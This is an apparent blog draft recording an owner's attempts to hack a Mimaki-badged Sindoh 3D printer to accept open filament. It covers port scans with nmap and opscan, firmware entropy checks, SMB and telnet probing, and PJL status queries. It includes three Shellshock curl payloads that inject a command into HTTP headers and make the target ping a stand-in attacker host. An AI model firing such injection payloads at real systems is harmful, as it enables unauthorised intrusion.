---
title: Hacking 3DFF-222 aka 3DWOX1
slug: hacking-3dff-222-aka-3dwox1
date_published: 1970-01-01T00:00:00.000Z
date_updated: 2023-04-27T18:40:56.000Z
draft: true
---

I came into a 'Mimaki' 3DFF-222 3D printer last year? Mimaki is in quotes as it's really a rebadged Sindoh 3DWOX1, although I'm not even sure rebadged is the correct term as it carries the branding for both Mimaki and Sindoh at the same time.

Having received the printer as a promotion whereby a large purchase for other Mimaki equipment provided the 3DFF for free, I wasn't even sure I was going to keep the 3DFF. Initially, I thought I would just turn around and sell the 3DFF and keep the money to offset the price of the Mimaki equipment. After seeing that the 3DFF could print open source filament, I was a bit intrigued and decided to give it a whirl before deciding on whether to keep or sell.

Well, it wasn't long before I was pretty disappointed. Apparently, Mimaki decided to cripple the machine that they badged and remove/bar the ability to use open source filament. Seeing as to how it felt that Mimaki didn't spend a lot of energy on rebadging this printer, I guessed that maybe it would be possible to modify/hack the 3DFF to utilize open source filaments. And so, the following:

UPDATE: *I received info about how to enable open material. Anybody reading this can contact me for the details. Still poking around this printer and it's internals for fun though.*

The 3DFF has wireless WiFi. I decided to scan available open ports:

`sudo nmap -sn -n 192.168.1.0/24 > devices.txt`
`nmap -sV -iL devices.txt > devices-ports.txt`

Note: 'sudo' is needed for root access when running nmap with -n switch to show corresponding MAC addresses. Otherwise, the nmap will still scan, but will not return any MAC addresses. Nicer to have the MACs to determine which IP is the 3DFF. I had opened the right side panel to reveal the main board and also the WiFi module which showed that the module was manufactured by LG Innotek.

Checking the list of ports for 3DFF it was shown that the following ports were open:

1. 80
2. 8080
3. 901

I downloaded the firmware from Sindoh's site here. After a quick look with binwalk:

`binwalk -E image.bin`
`binwalk -E image.app`

Both results for entropy was high, indicating that both files were encrypted or compressed.

'strings' command was useless, dumping way too much random data for it to be useful.

Attempted many different tries of shellshock:

`curl -H 'User-Agent: () { :; }; ping attacker.ip' [http://target.ip/](http://target.ip/)`
`curl -H 'Cookie: () { :; }; ping attacker.ip' [http://target.ip/](http://target.ip/)`
`curl -H 'Referer: () { :; }; ping attacker.ip' [http://target.ip/](http://target.ip/)`

Installed and tried nikto tool which seemed worthless.

SMB protocol might be available on HTTP server. Nevermind, maybe not. Checked with Rust scanner [opscan](https://crates.io/crates/opscan).

`opscan 192.168.1.0/24`

Tried SMB anyways on port 9100 (as default ports of 139 and 445 were obviously not open):

`smbclient -L 192.168.0.45 -p 9100`
`protocol negotiation failed: NT_STATUS_IO_TIMEOUT`

With no success.

Note: make sure to use opscan with a range of IPs. When I tried to scan all ports for a SINGLE IP then opscan would fail and return nothing. It's only when I tried to feed it a range of IPs scanning for a single or multiple ports that it worked.

OK, so after additional testing and having cloned and downloaded the opscan Github repo, I found that the anomalies with the opscan doesn't seem to be related to using a range of IPs. It seems that the problem lies with the concurrency settings. When I dialed down the concurrency settings to 100 instead of using the default (which is set to ~65000 for a private IP) I am able to successfully scan a single IP.

After gettting opscan to "work" with just a single IP and scanning all ports, I noticed that Rust opscan was showing different ports open than nmap. Maybe I wasn't using nmap with the proper settings? Here are the ports that opscan found:

1. 1337: labeled "waste" by opscan
2. 80: labeled "http" (this would only be discovered when I wake up the 3D printer by going to it's corresponding web page via a browser)
3. 8080: labeled "http-proxy"
4. 9100: labeled "jetdirect"
5. 35345: labeled "unknown"

If I feed the these open ports to nmap, e.g.:

`nmap 192.168.0.45 -p9100`

The nmap utility will confirm that the port is open.

Note: So, after a quick google, I [found](https://nmap.org/book/man-port-specification.html#:~:text=By%20default%2C%20Nmap%20scans%20the,1%2C000%20ports%20for%20each%20protocol.&amp;text=This%20option%20specifies%20which%20ports,scan%20and%20overrides%20the%20default.) that nmap by default will only scan the "most common 1,000" ports. There you go.

After my previous revelation, a new scan with nmap using the following command:

`nmap 192.168.0.45 -p1-10000`

Had the almost the same results as opscan and took 10.18 seconds to complete, but! When I tried a scan with nmap for 65K ports, the result was not so good. I left nmap to run and after around 30 minutes, it still wasn't complete and I killed the process. The laptop that I was using has some subpar specs, but even so, it seems that opscan set to 100 concurrency was way better.

Tried telnet'ing to port 9100:

`telnet 192.168.86.28 9100`

Another interesting scan method:

`avahi-browse -v -a -t`

This basically uses mDNS discovery to locate broadcasting services in your domain.

Hacking the printer ports does not seem to be working. Tried to telnet and nc to port 9100 and send it pjl commands, but no response. [This](http://h10032.www1.hp.com/ctg/Manual/bpl13208.pdf) is documentation on pjl from HP. [This](https://jacobsalmela.com/2015/02/05/change-the-serial-number-on-hp-printers-using-printer-job-language-and-netcat-ftp/) is a great walk through to send pjl commands via nc.

Going back to checking possible compression scheme of firmware download (image.bin). First by checking the first 10 bytes of the file:

`head -c 10 image.bin`

So, I went back to telnet and tried PJL (a printer language – see [this](https://developers.hp.com/system/files/PJL_Technical_Reference_Manual.pdf) manual for a great reference).

`Trying 192.168.86.28...`
`Connected to 192.168.86.28.`
`Escape character is '^]'.`

`@PJL INFO STATUS`
`@PJL INFO STATUS`
`CODE=42200`

`^]`

`telnet> QUIT`
`Connection closed.`

As you can see above, PJL does work for this printer, but only for a limited range of commands. Make sure you type PJL in all caps. The rest of the command is case insensitive. The second "INFO STATUS" is the echo from the printer and then the "code=42200" is the result.

I then typed ctrl-v to send the escape character which brings me to the telnet prompt, where I can type "quit" (again case insensitive) to exit telnet. If you type "?" in the prompt you will be given help for the various commands that telnet accepts.

I tried FSDIRLIST in many different combinations and couldn't get a correct response. My suspicion is that this command is not supported by this printer. In fact, it seems that "INFO STATUS" was one of the few commands I could get to work. Not sure if this vector is going to be all that helpful.
